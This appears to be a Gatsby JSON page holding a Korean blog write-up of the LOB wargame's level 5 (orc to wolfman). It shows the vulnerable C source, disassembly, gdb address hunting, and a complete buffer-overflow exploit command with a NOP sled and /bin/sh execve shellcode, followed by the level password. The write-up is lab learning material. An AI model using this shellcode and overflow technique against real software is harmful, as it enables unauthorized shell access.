{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221015/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>이번 문제도 저번 문제와 크게 다르지 않았다.</p>\n<h3>1. Level 5 : Orc -> Wolfman</h3>\n<p>소스코드를 확인해 보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n#include &lt;stdlib.h>\r\n\r\nextern char **environ;\r\n\r\nmain(int argc, char *argv[])\r\n{\r\n        char buffer[40];\r\n        int i;\r\n\r\n        if(argc &lt; 2){\r\n                printf(\"argv error\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // egghunter\r\n        for(i=0; environ[i]; i++)\r\n                memset(environ[i], 0, strlen(environ[i]));\r\n\r\n        if(argv[1][47] != '\\xbf')\r\n        {\r\n                printf(\"stack is still your friend.\\n\");\r\n                exit(0);\r\n        }\r\n        strcpy(buffer, argv[1]);\r\n        printf(\"%s\\n\", buffer);\r\n\r\n        // buffer hunter\r\n        memset(buffer, 0, 40);\r\n}</code></pre></div>\n<p>어셈블리 코드도 확인해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x8048500 &lt;main>:       push   %ebp\r\n0x8048501 &lt;main+1>:     mov    %ebp,%esp\r\n0x8048503 &lt;main+3>:     sub    %esp,44\r\n0x8048506 &lt;main+6>:     cmp    DWORD PTR [%ebp+8],1\r\n0x804850a &lt;main+10>:    jg     0x8048523 &lt;main+35>\r\n0x804850c &lt;main+12>:    push   0x8048640\r\n0x8048511 &lt;main+17>:    call   0x8048410 &lt;printf>\r\n0x8048516 &lt;main+22>:    add    %esp,4\r\n0x8048519 &lt;main+25>:    push   0\r\n0x804851b &lt;main+27>:    call   0x8048420 &lt;exit>\r\n0x8048520 &lt;main+32>:    add    %esp,4\r\n0x8048523 &lt;main+35>:    nop\r\n0x8048524 &lt;main+36>:    mov    DWORD PTR [%ebp-44],0x0\r\n0x804852b &lt;main+43>:    nop\r\n0x804852c &lt;main+44>:    lea    %esi,[%esi*1]\r\n0x8048530 &lt;main+48>:    mov    %eax,DWORD PTR [%ebp-44]\r\n0x8048533 &lt;main+51>:    lea    %edx,[%eax*4]\r\n0x804853a &lt;main+58>:    mov    %eax,%ds:0x8049760\r\n0x804853f &lt;main+63>:    cmp    DWORD PTR [%eax+%edx],0\r\n0x8048543 &lt;main+67>:    jne    0x8048547 &lt;main+71>\r\n0x8048545 &lt;main+69>:    jmp    0x8048587 &lt;main+135>\r\n0x8048547 &lt;main+71>:    mov    %eax,DWORD PTR [%ebp-44]</code></pre></div>\n<p>사실 밑에 buffer hunter라는 녀석이 생긴 것 말고는 달라진 점은 없다. 우리는 어차피 NOP SLED 방식을 활용하므로 buffer hunter로 초기화해도 프로그램 실행 흐름상 버퍼오버플로우를 발생시키는 것에 무리는 없다.</p>\n<p>저번 문제와 똑같이 카피코드를 gdb로 디버깅해서 주소를 찾았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">b * main\r\n\r\nr `python -c \"print 'A'*44+'\\xbf\\xbf\\xbf\\xbf'` `python -c \"print '\\x90'*200+\"B\"*40'`\r\n\r\n//대략적인 주소\r\n0xbffffc3c</code></pre></div>\n<p>익스플로잇 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./wolfman `python -c \"print 'A'*44 + '\\x3c\\xfc\\xff\\xbf'\"` `python -c \"print '\\x90' * 200 + '\\x31\\xc0\\xb0\\x31\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x31\\xc0\\xb0\\x46\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80'\"`</code></pre></div>\n<p>비밀번호 : love eyuna</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"시스템 해킹(21) : FTZ LOB LEVEL 5","summary":"","date":"2022.10.15.","before":"2022.10.14.","after":"2022.10.16.","categories":["C-SEC","KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVRkeVbT188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwEEERMSACFRktL/2gAIAQMBAT8B2ipFjU+yabLh3VyNorN1QQFT5GXGOYTKlxiOWAzy7zES0vA+0/PX/8QAHREAAgIDAAMAAAAAAAAAAAAAAgMBBBITIQAx0f/aAAgBAgEBPwGuMuOvJoppdUSYJeCVbhTaYb2I2CkSIJsG50wXM2nOMz0t7I5krnPR/PP/xAAmEAACAQIGAQQDAAAAAAAAAAABAgMEEgAFERMhMSIUFSNBMpLh/9oACAEBAAY/Aq/KJs3zY0sdJFQ5E0NXLTS5PPNOWhqKYMHtowj1Hqqa2QS7aIgAYuPccyzQZjIslRTpWqoaOojgndd7eXht1bXSxdOT4AnHLc/ficEaq61NHJQkSC/bjHzI8Wv4yo6eL92ySL0xxtONVU3qLmtTstYo0CljoSR9jrHCn9v5j//EABwQAQEAAgIDAAAAAAAAAAAAAAERACFBUTFxgf/aAAgBAQABPyHWJvxKWgfi8l2Skpfpos8FGJji06G0TyMHZz1jUCzgTuk9EUsRNJkdSKwnsSquMiP35+M//9oADAMBAAIAAwAAABCQH//EABgRAQEBAQEAAAAAAAAAAAAAAAERACFx/9oACAEDAQE/EE+TpdStOdiavBQ21X17v//EABkRAAIDAQAAAAAAAAAAAAAAABEhAAFBMf/aAAgBAgEBPxB+k27FYwBSsS4wEHlQrAzBqpT/xAAZEAEBAQEBAQAAAAAAAAAAAAABESEAMUH/2gAIAQEAAT8Qm5D613Vaz4sCNvgJQCOeKY0zpwewxUIRguqIInPHcqiaKJ4IxFQZhRsyiwbhBPoTrDrq6VSjvqK/Xv/Z"},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221015/"}},"staticQueryHashes":[]}